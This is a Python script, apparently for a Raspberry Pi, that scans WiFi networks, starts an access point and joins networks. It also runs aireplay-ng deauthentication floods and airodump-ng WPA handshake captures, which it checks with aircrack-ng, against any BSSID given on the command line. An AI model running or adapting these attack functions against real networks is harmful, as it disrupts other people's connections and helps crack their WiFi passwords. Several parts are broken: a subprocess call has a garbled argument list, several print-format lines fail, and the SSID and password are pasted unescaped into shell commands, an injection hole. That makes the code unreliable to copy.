#!/usr/bin/env python3
import os, subprocess, re, sys, time, json, datetime

def check_interface_mode(interface, mode):
    result = subprocess.call(['iwconfig', interface], stdout=subprocess.DEVNULL)
    if result == 0:
        output = subprocess.check_output(['iwconfig', interface]).decode('utf-8')
        if 'Mode:' + mode in output:
            return True
    return False


def scan_wifi(interface):
    if not check_interface_mode(interface, 'Managed'):
        subprocess.call([2, 3, interface, 4, 5])
    result = subprocess.Popen(['sudo', 'iwlist', interface, 'scan'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, _ = result.communicate()
    output = output.decode()
    networks = []
    current_network = {}
    for line in output.split('\n'):
        if 'Cell ' in line:
            if current_network:
                networks.append(current_network)
                current_network = {}
            current_network['Address'] = line.split('Address: ')[1].strip()
        elif 'ESSID:' in line:
            current_network['ESSID'] = line.split('ESSID:"')[1].split('"')[0]
        elif 'Protocol:' in line:
            current_network['Protocol'] = line.split('Protocol:')[1]
        elif 'Mode:' in line:
            current_network['Mode'] = line.split('Mode:')[1]
        elif 'Frequency:' in line:
            frequency_info = line.split('Frequency:')[1].strip()
            frequency, channel = frequency_info.split(' (Channel ')
            current_network['Frequency'] = frequency
            current_network['Channel'] = channel[:-1]
        elif 'Encryption key:' in line:
            current_network['Encryption'] = line.split('Encryption key:')[1]
        elif 'Bit Rates:' in line:
            current_network['Bit Rates'] = line.split('Bit Rates:')[1]
        elif 'Quality=' in line:
            quality = line.split('Quality=')[1].split(' ')[0]
            signal_level = line.split('Signal level=')[1].split(' ')[0]
            current_network['Quality'] = quality
            current_network['Signal level'] = signal_level

    if current_network:
        networks.append(current_network)
    networks = json.dumps(networks, indent=4)
    print(networks)
    return networks


def deauth_attack(interface, bssid, clients=None, packet_number=10):
    if clients != None:
        for client in clients:
            print('Deauthing: ' + client)
            subprocess.call(['sudo', 'aireplay-ng', '-0', str(packet_number), '-D', '-a', bssid, '-c', client, interface], shell=True)

    else:
        print('Deauthanticating all clients from: ' + bssid)
        subprocess.call(['sudo', 'aireplay-ng', '-0', str(packet_number), '-D', '-a', bssid, interface])
    return


def connect_to_wifi(ssid, password, interface):
    try:
        import time
        print('Starting NetworkManager...')
        subprocess.call('sudo systemctl start NetworkManager', shell=True)
        print('Waiting 5 seconds...')
        time.sleep(5)
        print('Connecting to ' + ssid + '...')
        subprocess.call('sudo nmcli device wifi connect ' + ssid + ' password ' + password + ' ifname ' + interface, shell=True)
        time.sleep(3)
        subprocess.call('sudo systemctl restart ssh', shell=True)
    except Exception as e:
        print('Error: ' + e)
        print('Waiting 5 seconds...')
        time.sleep(5)
        print('Retrying...')
        connect_to_wifi(ssid, password, interface)


def start_wifi_ap():
    try:
        subprocess.call('sudo nmcli device disconnect wlan0', shell=True)
        dnsmasq_status = subprocess.call('sudo systemctl is-active dnsmasq', shell=True)
        if dnsmasq_status == 0:
            print('dnsmasq is already running. WiFi Access Point might already be active.')
            subprocess.call('sudo systemctl restart dnsmasq', shell=True)
        else:
            subprocess.call('sudo systemctl start dnsmasq', shell=True)
        subprocess.call('sudo systemctl enable dnsmasq', shell=True)
        hostapd_status = subprocess.call('sudo systemctl is-active hostapd', shell=True)
        if hostapd_status == 0:
            print('hostapd is already running. WiFi Access Point might already be active.')
            subprocess.call('sudo systemctl restart hostapd', shell=True)
        else:
            subprocess.call('sudo systemctl start hostapd', shell=True)
        subprocess.call('sudo systemctl enable hostapd', shell=True)
        print('WiFi Access Point started successfully!')
        time.sleep(3)
        print('Restarting ssh...')
        subprocess.call('sudo systemctl restart ssh', shell=True)
    except Exception as e:
        print ('Error starting WiFi Access Point: {}').format(e)
        print('Waiting 5 seconds...')
        time.sleep(5)
        print('Retrying...')
        start_wifi_ap()


def capture_handshake(interface, bssid, channel, output_file, waiting_time_s=10, packet_numb=15):
    now = datetime.datetime.now()
    formatted_date = now.strftime('%Y-%m-%d_%H:%M:%S')
    output_file = os.path.join('/home/pi/captures', output_file + '_' + formatted_date)
    print('Output File:', output_file)
    print('Starting packet capture...')
    airodump_process = subprocess.Popen(['airodump-ng', '--bssid', bssid, '-c', str(channel), '-w', output_file, interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print('Deauthing clients...')
    deauth_process = subprocess.Popen(['sudo', 'aireplay-ng', '-0', str(packet_numb), '-D', '-a', bssid, interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print ('[+] Sleeping for {} seconds...').format(waiting_time_s)
    time.sleep(waiting_time_s)
    airodump_process.terminate()
    deauth_process.terminate()
    handshake_file = output_file + '-01.cap'
    if not os.path.exists(handshake_file):
        print('Error: Handshake capture file not found.')
        return None
    else:
        result = subprocess.run(['aircrack-ng', handshake_file], capture_output=True, text=True)
        if '1 handshake' not in result.stdout:
            print('Error: No handshake found in the capture file.')
            os.remove(handshake_file)
            return None
        return handshake_file


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Invalid option. Usage: sudo python wifi.py [-ap] [-c <ssid> <password>] [-s <interface>] [-da <interface> <bssid> <[clientsarray]> <duration>] [-h <interface> <bssid> <channel> <filename> ]')
        sys.exit(1)
    if sys.argv[1] == '-ap':
        start_wifi_ap()
    elif sys.argv[1] == '-c':
        if len(sys.argv) != 4:
            print('Usage: sudo python wifi.py -c <ssid> <password>')
            sys.exit(1)
        ssid = sys.argv[2]
        password = sys.argv[3]
        connect_to_wifi(ssid, password, 'wlan0')
    elif sys.argv[1] == '-s':
        if len(sys.argv) != 3:
            print('Usage: sudo python wifi.py -s <interface>')
            sys.exit(1)
        interface = sys.argv[2]
        scan_wifi(interface)
    if sys.argv[1] == '-da':
        if not len(sys.argv) >= 4:
            print('Usage: sudo python wifi.py -da <interface> <bssid> <packet Number> <clients>')
            print('!Only interface and bssid is required the rest has default values!')
            print('-' * 76)
            print('If packet Number is 0 it will senf packets infinitly else deafault is 10')
            print('clients (list, optional): A list of client MAC addresses to deauthenticate.\nIf option clients is left out all clients will be deathanticated.')
            sys.exit(1)
        interface = sys.argv[2]
        bssid = str(sys.argv[3])
        clients = None
        packetNumb = 10
        if len(sys.argv) == 6:
            clients = sys.argv[5]
        if len(sys.argv) == 5:
            packetNumb = int(sys.argv[4])
        deauth_attack(interface, bssid, clients, packetNumb)
    elif sys.argv[1] == '-h':
        if not len(sys.argv) == 6:
            print('Usage: sudo python wifi.py -h <interface> <bssid> <channel> <filename> ')
            sys.exit(1)
        interface = sys.argv[2]
        bssid = str(sys.argv[3])
        channel = sys.argv[4]
        name = sys.argv[5]
        print(capture_handshake(interface, bssid, channel, name))
    else:
        print('Invalid option. Usage: sudo python wifi.py [-ap] [-c <ssid> <password>] [-s <interface> <scan_interval> <output_file> ] [-da <interface> <bssid> <[clientsarray]> <duration>] [-h <interface> <bssid> <channel> <filename> ]')